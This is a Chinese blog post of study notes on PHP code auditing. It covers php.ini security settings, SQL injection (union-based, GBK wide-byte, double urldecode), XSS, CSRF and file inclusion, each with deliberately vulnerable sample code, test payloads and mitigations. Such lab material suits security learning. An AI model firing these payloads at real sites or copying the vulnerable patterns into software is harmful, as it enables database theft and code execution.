<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p>
<h3 id="4-magic-quotes-runtime-魔术引号自动过滤"><a href="#4-magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="4.magic_quotes_runtime(魔术引号自动过滤)"></a><strong>4.magic_quotes_runtime(魔术引号自动过滤)</strong></h3><p>magic_quotes_runtime和magic_quotes_gpc功能一样，区别是处理的对象不一样</p>
<p>magic_quotes_runtime<strong>只对从数据库或者文件中获取的数据进行过滤</strong></p>
<p>由于很多人只对外部输入的数据进行过滤，所以有的攻击者可先将攻击代码写入数据库，在程序读取后即可触发攻击</p>
<p>同样<strong>在PHP5.4版本以后也取消了</strong></p>
<p>注意，只有部分函数受它影响，所以是可以绕过这个配值的。</p>
<p>受影响的包括get_meta_tags()、stream_socket_recvform()、exec()…等等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件1.txt  1 '2"3\4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"magic_quotes_runtime"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"D:/phpstudy_pro/WWW/phpsafe/1.txt"</span>);<span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> \<span class="string">'2\"3\\4</span></span><br></pre></td></tr></table></figure>

<h3 id="5-magic-quotes-sybase-魔术引号自动过滤"><a href="#5-magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="5.magic_quotes_sybase(魔术引号自动过滤)"></a><strong>5.magic_quotes_sybase(魔术引号自动过滤)</strong></h3><p>magic_quotes_sybase指令用于自动过滤特殊字符，设置为on时，会覆盖gpc的配值</p>
<p>它和gpc的区别在于，仅仅转义了空字符和把单引号( ’ )变成了双引号( “ )</p>
<p>在PHP5.4.0中移除了</p>
<h3 id="6-safe-mode-安全模式"><a href="#6-safe-mode-安全模式" class="headerlink" title="6.safe_mode(安全模式)"></a><strong>6.safe_mode(安全模式)</strong></h3><p>安全模式是PHP内嵌的一种安全机制，当safe_mode=on时：</p>
<p>（1）所有文件操作函数都会收到限制</p>
<p>（2）通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误</p>
<h3 id="7-open-basedir-PHP-可访问目录"><a href="#7-open-basedir-PHP-可访问目录" class="headerlink" title="7.open_basedir PHP 可访问目录"></a><strong>7.open_basedir PHP 可访问目录</strong></h3><p>open_basedi指令用来限制PHP只能访问哪些目录</p>
<p>例如配值open_basedi=/www/a，那么目录/www/a 和 /www/ab 都是可以访问的。</p>
<p>如果open_basedi=/www/a/，那么只能访问/www/a/</p>
<p>PHP版本小于5.2.3时，是PHP_INI_SYSTEM，</p>
<p>大于等于5.2.3是PHP_INI_ALL</p>
<h3 id="8-disable-functions-禁用函数"><a href="#8-disable-functions-禁用函数" class="headerlink" title="8.disable_functions(禁用函数)"></a><strong>8.disable_functions(禁用函数)</strong></h3><p>在正式的生产环境中，为了更安全的运行PHP，使用此指令来禁止一些敏感函数的使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=phpinfo,<span class="keyword">eval</span>,passthru,exec,system</span><br></pre></td></tr></table></figure>

<p>配值禁用函数的时候，按照以上格式分割函数名，配值范围是php.ini only</p>
<p>切记，也要把dl()函数加到禁用列表，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破限制。</p>
<h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
<p>error_reporting 是用来配值错误显示的级别。</p>
<hr>
<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" alt></p>
<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" alt></p>
<hr>
<h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
<p>攻击方式：</p>
<p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
<p>二、在权限较小的情况下，可获得管理员密码等，或者修改数据库内容进行钓鱼等</p>
<p>常用工具：sqlmap</p>
<p>挖掘经验：sql注入经常出现在登录页面、获取HTTP头、订单处理等</p>
<p>登录页面的注入多数发生在HTTP头里面的client-ip和x-forward-for</p>
<p>1.1普通注入</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uid=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id=$uid"</span>;</span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>);</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.1php?id=-1 union select 1,user(),3,4</span></span><br><span class="line">当前SQL语句：SELECT*FROM userinfo where id=<span class="number">-1</span> union select <span class="number">1</span>,user(),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">结果：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> [<span class="number">1</span>] =&gt; root@localhost [<span class="number">2</span>] =&gt; <span class="number">3</span> [<span class="number">3</span>] =&gt; <span class="number">4</span> )</span><br></pre></td></tr></table></figure>

<p>需要注意的是，7.x版本中已经舍弃了mysql_connect()，所以需要改为mysqli_connect()</p>
<table>
<thead>
<tr>
<th><strong>mysqli_fetch_row()</strong></th>
<th><strong>从结果集中取得一行，并作为枚举数组返回。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>mysqli_select_db()</strong></td>
<td><strong>用于更改连接的默认数据库</strong></td>
</tr>
<tr>
<td><strong>mysqli_query()</strong></td>
<td><strong>执行某个针对数据库的查询。</strong></td>
</tr>
<tr>
<td><strong>mysqli_connect()</strong></td>
<td><strong>打开一个到 MySQL 服务器的新的连接</strong></td>
</tr>
</tbody></table>
<p>从上述测试代码可以知道，数据库操作存在一些关键词如mysqli_query等，查询方式还有update、insert、delete等</p>
<p>在做白盒审计的时候，只需要查找这些关键字就可以定向挖掘SQL注入漏洞。</p>
<h3 id="2-编码注入-宽字节注入"><a href="#2-编码注入-宽字节注入" class="headerlink" title="2.编码注入-宽字节注入"></a><strong>2.编码注入-宽字节注入</strong></h3><p>程序在操作前会进行一些编码处理，通过输入转码函数不兼容的特殊字符，可以导致输出的字符变成有害数据</p>
<p>最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的</p>
<p><strong>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</strong></p>
<p>这是由于单引号被自动转义成 \‘  , 前面的<strong>%df和转义字符\ 反斜杠(%5c) 组合成了 %df%5c</strong> 。也就是運字</p>
<p>这时候单引号依然还在，于是成功闭合了前面的单引号</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>)<span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">"set names 'gbk'"</span>);</span><br><span class="line">$uid=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id='$uid'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"wro"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%df<span class="string">' union select 1,2,3,4#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前SQL语句：<span class="keyword">SELECT</span> <span class="keyword">id</span>,username <span class="keyword">FROM</span> userinfo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'�\'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">#'</span></span><br><span class="line">结果：<span class="built_in">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">test</span> [<span class="number">1</span>] =&gt; root@localhost )</span><br></pre></td></tr></table></figure>

<h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>

<p>输入：<strong>?p=1%2527</strong></p>
<p>输出：*<em>$a=1%27     *</em></p>
<p>​           <strong>$b=1’</strong></p>
<p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
<p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
<p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
<p>4.espcms 搜索注入分析</p>
<p>部分代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=urldecode(<span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">'key'</span>,<span class="string">'R'</span>));</span><br><span class="line">···</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">	$db_where.=<span class="string">"AND FIND_IN_SET('$key',tags)"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于$key变量使用了urldecode，从而可以绕过GPC</p>
<p>如果$key不为空，则拼接到SQL语句中，导致产生注入漏洞</p>
<h3 id="4-漏洞防范"><a href="#4-漏洞防范" class="headerlink" title="4.漏洞防范"></a><strong>4.漏洞防范</strong></h3><p>在PHP5.4版本之前可以用魔术引号解决</p>
<p>后面虽然被取消了，但可以用<strong>过滤函数和类</strong>来解决</p>
<p>如discuz、dedecms、phpcms等程序都使用了过滤类</p>
<p>但仍然存在绕过的问题，最好的解决方法是利用<strong>预编译的方式</strong></p>
<h4 id="4-1-gpc-rutime-魔术引号"><a href="#4-1-gpc-rutime-魔术引号" class="headerlink" title="4.1 gpc/rutime 魔术引号"></a><strong>4.1 gpc/rutime 魔术引号</strong></h4><p>通常数据污染有2种，一种是GET、POST等被动接收参数</p>
<p>还有一种是主动获取参数，如读取远程页面或者文件内容</p>
<p>所以防止SQL注入，就是要守住这2条路！</p>
<p>魔术引号对int型的注入是没多大作用的。</p>
<h4 id="4-2-过滤函数和类"><a href="#4-2-过滤函数和类" class="headerlink" title="4.2 过滤函数和类"></a><strong>4.2 过滤函数和类</strong></h4><p>过滤函数和类有2种使用场景，一种是程序入口统一过滤，像框架程序用的多</p>
<p>另一种是在程序进行SQL语句之前使用，除了PHP内置的一些过滤单引号等函数外</p>
<p>还有一些开源类过滤union、select等关键字</p>
<p><strong>1.addslashes</strong>函数</p>
<p>以下方法可以绕过该函数</p>
<table>
<thead>
<tr>
<th>$userid = urldecode($userid)</th>
<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$userid = rawurldecode($userid)</strong></td>
<td></td>
</tr>
<tr>
<td><strong>$userid = base64_decode($userid)</strong></td>
<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
</tr>
<tr>
<td><strong>$userid = json_encode($userid)</strong></td>
<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
</tr>
</tbody></table>
<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
<p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>

<p>推荐使用mysql_real_escape_string() ，因为它接受的是一个连接句柄并根据当前字符集转义字符串</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from test where id=' "</span>.$id.<span class="string">" '  "</span>;</span><br></pre></td></tr></table></figure>

<p>当id=1’ 时，输出id=’ 1 \ ‘’</p>
<p><strong>3.intval 等字符转换</strong></p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=intval(<span class="string">"1 union select"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id;  <span class="comment">#输出为1</span></span><br></pre></td></tr></table></figure>

<p>intval 是将变量转换成int型,可以防止盲注等方式绕过。</p>
<h4 id="4-3-PDO-prepare-预编译"><a href="#4-3-PDO-prepare-预编译" class="headerlink" title="4.3 PDO prepare 预编译"></a><strong>4.3 PDO prepare 预编译</strong></h4><h3 id="5-XSS漏洞"><a href="#5-XSS漏洞" class="headerlink" title="5.XSS漏洞"></a><strong>5.XSS漏洞</strong></h3><p>在Web漏洞中，XSS是最多的！它可以通过外部输入然后直接在浏览器端触发，即<strong>反射型XSS</strong></p>
<p>还可以通过把代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面时触发–<strong>存储型XSS</strong></p>
<p>危害：前端页面能做的事情，它都可以（如获取cookie，修改页面钓鱼等）</p>
<h4 id="5-1-挖掘经验"><a href="#5-1-挖掘经验" class="headerlink" title="5.1 挖掘经验"></a><strong>5.1 挖掘经验</strong></h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数</p>
<p>常用的输出函数如下：<strong>var_dump、var_export、die、sprintf、print、print_r、echo、printf</strong></p>
<p>所以只需要寻作带有变量的这些函数即可</p>
<p>注意：<strong>浏览器环境十分影响XSS漏洞的利用</strong>，还需要掌握各种<strong>浏览器容错、编码等特性和数据协议</strong></p>
<p>XSS漏洞经常出现在<strong>文章发表、评论回复、留言以及资料设置</strong>等地方</p>
<p>因为这里有各种图片引用、文字格式设置等，经常出现<strong>对标签事件过滤不严格</strong>导致的XSS</p>
<p>还有就是用户昵称可能不止一处可以修改，不一定所有地方都严格过滤了，所以可以多关注这几个地方</p>
<h4 id="5-2-反射型XSS"><a href="#5-2-反射型XSS" class="headerlink" title="5.2 反射型XSS"></a><strong>5.2 反射型XSS</strong></h4><p>可通过扫描器黑盒直接发现</p>
<p>只需要将&lt;&gt;、‘ 、“ 等题交到Web服务器，检查返回的HTML页面是否保留原来的特殊字符就可以判断</p>
<p>在白盒审计中，只需要寻作带有参数的输出函数，然后根据输出函数对输出内容回溯输入参数，观察是否经过过滤</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
<p>所以可以直接利用GET方式注入代码</p>
<h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>这里代码直接把显示logo的img标签放在span标签的title里面</p>
<p>当鼠标滑过的时候，会调用事件执行显示title，即执行img标签</p>
<p>所以这里的利用点就是可以是HTML实体编码，从而绕过安全检查</p>
<p>在logo处输入 1 oner&114;or=ale &amp; #114;t(1)</p>
<h4 id="5-4-XSS漏洞防范"><a href="#5-4-XSS漏洞防范" class="headerlink" title="5.4 XSS漏洞防范"></a><strong>5.4 XSS漏洞防范</strong></h4><p>特殊字符HTML实体转码</p>
<p>标签事件属性黑白名单</p>
<h3 id="6-CSRF漏洞"><a href="#6-CSRF漏洞" class="headerlink" title="6.CSRF漏洞"></a><strong>6.CSRF漏洞</strong></h3><p>CSRF=Cross-site request forgery 跨站请求伪造</p>
<p>通俗来讲就是劫持其它用户去进行一些请求</p>
<p>简单的攻击流程讲解：</p>
<p>假设直接请求x.com/del.php?id=1 可以删除ID为1的账号，但是需要管理权限</p>
<p>如果在其它网站页面加入&lt; img src=” http: //x.com/del.php?id=1 “&gt;,让管理员打开，就达到目的了</p>
<p>更严重的像添加管理员账号、修改网站配值直接写入webshell等等</p>
<h4 id="6-1-挖掘经验"><a href="#6-1-挖掘经验" class="headerlink" title="6.1 挖掘经验"></a><strong>6.1 挖掘经验</strong></h4><p>CSRF主要是用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台、会员中心</p>
<p>论坛帖子以及交意管理等，管理后台又是最高危的地方</p>
<p>挖掘CSRF的时候，可以先搭好环境，打开几个非静态操作的页面，抓包查看有没有token</p>
<p>如果没有token，直接请求这个页面，不带refer</p>
<p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
<p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
<p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
<p><strong>1.Token验证</strong></p>
<p>token翻译为”标志”，在计算机认证领域叫令牌</p>
<p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
<p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
<p>Token实现测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function set_token()&#123;</span><br><span class="line">	$_SESSION[&#39;token&#39;]&#x3D;md5(time()+rand(1,1000));</span><br><span class="line">&#125;</span><br><span class="line">function check_token()&#123;</span><br><span class="line">	if(isset($_POST[&#39;token&#39;])&amp;&amp;$_POST[&#39;token&#39;]&#x3D;&#x3D;&#x3D;$_SESSION[&#39;token&#39;])</span><br><span class="line">	&#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123; return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_SESSION[&#39;token&#39;])&amp;&amp;check_token())&#123;</span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;failed&quot;;&#125;</span><br><span class="line">set_token();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&lt;?&#x3D;$_SESSION[&#39;token&#39;]?&gt;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">

<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
<p>下面是基于HTTP协议测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>

<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">

<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
<hr>
<h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>例如：</p>
